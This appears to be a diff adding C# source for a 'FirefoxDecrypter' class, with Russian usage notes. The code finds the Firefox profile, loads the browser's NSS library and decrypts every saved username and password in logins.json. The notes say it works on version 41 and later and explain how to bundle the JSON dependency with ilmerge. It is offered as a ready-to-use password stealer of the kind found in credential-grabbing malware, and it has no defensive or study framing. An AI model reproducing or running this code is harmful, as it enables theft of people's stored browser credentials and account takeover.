@@ -1,0 +1,247 @@
+Decrypt Class
+
+sing Microsoft.Win32;
+using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Text;
+ 
+namespace FirefoxDecrypter
+{
+    public static class Firefox
+    {
+        private static IntPtr _nssModule;
+        private static DirectoryInfo _firefoxPath;
+        private static DirectoryInfo _firefoxProfilePath;
+ 
+        static Firefox()
+        {
+            if (!isFirefoxInstalled) return;
+            _firefoxPath = GetFirefoxInstallPath();
+            _firefoxProfilePath = GetProfilePath();
+        }
+ 
+        private static bool isFirefoxInstalled
+        {
+            get { return GetFirefoxInstallPath() != null; }
+        }
+ 
+        private static DirectoryInfo GetFirefoxInstallPath()
+        {
+            RegistryKey _registryKey = Environment.Is64BitOperatingSystem == true ? Registry.LocalMachine.OpenSubKey(@"SOFTWARE\WOW6432Node\Mozilla\Mozilla Firefox") : Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox");
+ 
+            string[] installedVersions = _registryKey.GetSubKeyNames();
+ 
+            if (installedVersions.Length == 0) return null;
+ 
+            RegistryKey mainInstall = _registryKey.OpenSubKey(installedVersions[0]);
+ 
+            string installString = mainInstall.OpenSubKey("Main").GetValue("Install Directory").ToString();
+ 
+            return installString == null ? null : new DirectoryInfo(installString);
+        }
+ 
+        private static DirectoryInfo GetProfilePath()
+        {
+            DirectoryInfo profileDir = new DirectoryInfo($@"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\Mozilla\Firefox\Profiles");
+ 
+            if (!profileDir.Exists) return null;
+ 
+            DirectoryInfo[] profiles = profileDir.GetDirectories();
+ 
+            return profiles.Length == 0 ? null : profiles[0];
+        }
+ 
+        public static List<FirefoxCredential> GetCredentials()
+        {
+            List<FirefoxCredential> credentials = new List<FirefoxCredential>();
+ 
+            InitializeDelegates(_firefoxProfilePath, _firefoxPath);
+ 
+            JsonFFData ffLoginData = JsonConvert.DeserializeObject<JsonFFData>(File.ReadAllText(GetFile(_firefoxProfilePath, "logins.json").FullName));
+ 
+            foreach (LoginData data in ffLoginData.logins)
+            {
+                credentials.Add(new FirefoxCredential() { Host = data.formSubmitURL, Username = Decrypt(data.encryptedUsername), Password = Decrypt(data.encryptedPassword) });
+            }
+ 
+            return credentials;
+        }
+ 
+        private static void InitializeDelegates(DirectoryInfo firefoxProfilePath, DirectoryInfo firefoxPath)
+        {
+            // LoadLibrary(firefoxPath.FullName + "\\msvcp120.dll");
+            // LoadLibrary(firefoxPath.FullName + "\\msvcr120.dll");
+            // LoadLibrary(firefoxPath.FullName + "\\mozglue.dll");
+            SetDllDirectory(firefoxPath.FullName);
+            _nssModule = LoadLibrary("nss3.dll");
+            SetDllDirectory(null);
+            NSS_Init(firefoxProfilePath.FullName);
+            PK11_Authenticate(PK11_GetInternalKeySlot(), true, 0);
+        }
+ 
+        private static FileInfo GetFile(DirectoryInfo profilePath, string searchTerm)
+        {
+            FileInfo[] files = profilePath.GetFiles(searchTerm);
+ 
+            return files.Length == 0 ? null : files[0];
+        }
+ 
+        private static string Decrypt(string cipherText)
+        {
+            StringBuilder sb = new StringBuilder(cipherText);
+            TSECItem tSecDec = new TSECItem();
+            TSECItem item = Marshal.PtrToStructure<TSECItem>(new IntPtr(NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length)));
+ 
+            if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
+            {
+                if (tSecDec.SECItemLen != 0)
+                {
+                    byte[] bvRet = new byte[tSecDec.SECItemLen];
+                    Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
+                    return Encoding.UTF8.GetString(bvRet);
+                }
+            }
+ 
+            return null;
+        }
+ 
+        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
+ 
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
+ 
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool SetDllDirectory(string lpPathName);
+ 
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long NSS_InitPtr(string configdir);
+ 
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int PK11SDR_DecryptPtr(ref TSECItem data, ref TSECItem result, int cx);
+ 
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long PK11_GetInternalKeySlotPtr();
+ 
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate long PK11_AuthenticatePtr(long slot, bool loadCerts, long wincx);
+ 
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate int NSSBase64_DecodeBufferPtr(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
+ 
+        [StructLayout(LayoutKind.Sequential)]
+        private struct TSECItem
+        {
+            public int SECItemType;
+            public int SECItemData;
+            public int SECItemLen;
+        }
+ 
+ 
+        private class JsonFFData
+        {
+            public long nextId;
+            public LoginData[] logins;
+            public string[] disabledHosts;
+            public int version;
+        }
+ 
+        private class LoginData
+        {
+            public long id;
+            public string hostname;
+            public string httpRealm;
+            public string formSubmitURL;
+            public string usernameField;
+            public string passwordField;
+            public string encryptedUsername;
+            public string encryptedPassword;
+            public string guid;
+            public int encType;
+            public long timeCreated;
+            public long timeLastUsed;
+            public long timePasswordChanged;
+            public long timesUsed;
+        }
+ 
+        private static long NSS_Init(string configdir)
+        {
+            return Marshal.GetDelegateForFunctionPointer<NSS_InitPtr>(GetProcAddress(_nssModule, "NSS_Init"))(configdir);
+        }
+ 
+        private static long PK11_GetInternalKeySlot()
+        {
+            return Marshal.GetDelegateForFunctionPointer<PK11_GetInternalKeySlotPtr>(GetProcAddress(_nssModule, "PK11_GetInternalKeySlot"))();
+        }
+ 
+        private static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
+        {
+            return Marshal.GetDelegateForFunctionPointer<PK11_AuthenticatePtr>(GetProcAddress(_nssModule, "PK11_Authenticate"))(slot, loadCerts, wincx);
+        }
+ 
+        private static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
+        {
+            return Marshal.GetDelegateForFunctionPointer<NSSBase64_DecodeBufferPtr>(GetProcAddress(_nssModule, "NSSBase64_DecodeBuffer"))(arenaOpt, outItemOpt, inStr, inLen);
+        }
+ 
+        private static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
+        {
+            return Marshal.GetDelegateForFunctionPointer<PK11SDR_DecryptPtr>(GetProcAddress(_nssModule, "PK11SDR_Decrypt"))(ref data, ref result, cx);
+        }
+    }
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Json Class
+
+
+
+
+namespace FirefoxDecrypter
+{
+    public class FirefoxCredential
+    {
+        public string Username { get; set; }
+        public string Password { get; set; }
+        public string Host { get; set; }
+        public override string ToString()
+        {
+            return $"{Username}\n{Password}\n{Host}";
+        }
+    }
+}
+
+
+
+
+
+
+
+How use:
+
+Console.WriteLine(Firefox.GetCredentials()[0].ToString());
+Console.ReadKey();
+
+
+
+Вытягивает пароли с версии 41 и выше
+Для запуска и сборки нужен .NET Framework 4.5.2
+А так же JSon.dll, что совсем не приятно
+
+Декодер json'a есть в нугете, а уж прилепить его ilmerge'ом совсем никаких проблем.
